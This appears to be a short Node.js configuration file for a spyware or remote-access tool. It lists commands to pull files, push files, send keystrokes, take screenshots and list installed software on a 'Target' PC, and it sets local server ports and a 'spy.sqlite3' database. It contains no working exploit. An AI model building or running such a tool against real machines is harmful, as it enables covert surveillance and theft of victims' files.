var path = require("path");

module.exports.CUSTOM_COMMANDS = {
			"-get [F_name|Dir_name] [save_path]" : "Get file|Dir ,save it in 'path' or default_paht if not specified",
			"-send [filename] [save_path]" : "Send a file to the Target",
			"-keystroke [key_to_send]": "Send a keystroke to the Target",
			"-screenshot [type]" : "Get a screenshot with [Type=full_screen or Type=window [window_name] ]",
			"_custom_installed_softs": "Get Installed softwares in target's PC"
			};

module.exports.WEB_SRV = "localhost";
module.exports.WEB_PORT = 80;

module.exports.SOCK_PORT = 6824;
module.exports.SOCK_SRV = "127.0.0.1";

module.exports.STREAM_PORT = 4286;

module.exports.FTP_PORT = 8642;
module.exports.DEFAULT_SAVING_DIR = "target_files";

module.exports.DB_FILE = path.join("db","spy.sqlite3");